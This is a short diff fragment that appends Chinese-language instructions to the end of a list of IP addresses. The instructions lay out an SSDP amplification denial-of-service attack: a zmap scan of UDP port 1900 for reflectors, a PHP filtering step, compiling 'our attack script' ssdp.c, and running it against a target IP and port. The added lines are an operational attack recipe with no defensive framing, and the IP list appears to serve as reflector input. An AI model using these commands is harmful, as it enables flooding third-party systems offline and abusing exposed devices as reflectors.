@@ -806,3 +806,12 @@
 14.21.33.66
 14.149.67.146
 13.124.238.22
+
+
+开始扫描SSDP放大列表
+screen zmap -M udp -p 1900 --probe-args=file:upnp_1900.pkt -o ssdp.txt
+等扫描完成后,我们开始执行过滤!
+php ssdpfilter.php ssdp.txt ssdpfiltered.txt 200 1000
+然后,编译我们的攻击脚本,
+gcc -pthread ssdp.c -o ssdp
+./ssdp <target IP> <target port> <reflection file>  <time (optional)>
